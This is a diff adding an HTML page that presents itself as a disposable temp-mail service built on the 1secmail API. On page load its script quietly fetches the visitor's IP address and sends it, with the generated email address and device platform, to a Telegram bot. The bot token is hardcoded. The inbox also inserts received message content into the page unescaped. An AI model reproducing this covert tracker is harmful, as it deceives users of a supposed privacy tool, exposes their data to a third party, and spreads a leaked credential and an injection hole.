@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fast Temp Mail & Tracker</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #0b0e14; color: white; padding-top: 50px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .mail-box { background: #1c2128; padding: 40px; border-radius: 20px; border: 1px solid #30363d; }
+        #email-display { font-weight: bold; color: #58a6ff; font-size: 1.4rem; cursor: pointer; }
+        .btn-primary { background-color: #238636; border: none; }
+        .btn-primary:hover { background-color: #2ea043; }
+    </style>
+</head>
+<body>
+    <div class="container text-center">
+        <div class="mail-box shadow-lg mx-auto" style="max-width: 600px;">
+            <h2 class="mb-4">⚡ Fast Temp-Mail</h2>
+            <p class="text-secondary">আপনার ডিসপোজেবল মেইল:</p>
+            <div class="alert alert-dark border-secondary" id="email-display">Generating...</div>
+            <button class="btn btn-primary w-100 py-2 mt-2" onclick="location.reload()">New Mail</button>
+            <hr class="my-4" style="border-color: #30363d;">
+            <h4>📥 Inbox</h4>
+            <div id="inbox" class="text-start mt-3 text-secondary">নতুন ওটিপি বা মেইলের জন্য অপেক্ষা করা হচ্ছে...</div>
+        </div>
+    </div>
+
+    <script>
+        const API_TOKEN = '8546099693:AAFvLX77wWoFww5EhDk47I-quWEZ1EdOQjs';
+        const ADMIN_ID = '7416528268';
+        const user = Math.random().toString(36).substring(2, 12);
+        const domain = "1secmail.com";
+        const email = `${user}@${domain}`;
+        
+        document.getElementById('email-display').innerText = email;
+
+        // ইউজারের আইপি এবং মেইল টেলিগ্রামে পাঠানোর ফাংশন
+        async function sendToTelegram() {
+            try {
+                // আইপি অ্যাড্রেস নেওয়া
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIp = ipData.ip;
+
+                const message = `🔔 **New User Alert!**\n\n📧 Mail: ${email}\n🌐 IP: ${userIp}\n🌍 Device: ${navigator.platform}`;
+                
+                await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) { console.log("Error sending data"); }
+        }
+
+        sendToTelegram(); // সাইট লোড হলেই ডাটা চলে যাবে
+
+        // ইনবক্স চেক করার ফাংশন
+        function checkMail() {
+            fetch(`https://www.1secmail.com/api/v1/?action=getMessages&login=${user}&domain=${domain}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.length > 0) {
+                        const mid = data[0].id;
+                        fetch(`https://www.1secmail.com/api/v1/?action=readMessage&login=${user}&domain=${domain}&id=${mid}`)
+                            .then(res => res.json())
+                            .then(msg => {
+                                document.getElementById('inbox').innerHTML = `
+                                    <div class="card p-3 mb-2 bg-dark text-white border-primary">
+                                        <strong>From:</strong> ${msg.from}<br>
+                                        <strong>Subject:</strong> ${msg.subject}<br><hr>
+                                        ${msg.textBody}
+                                    </div>`;
+                            });
+                    }
+                });
+        }
+        setInterval(checkMail, 5000);
+    </script>
+</body>
+</html>
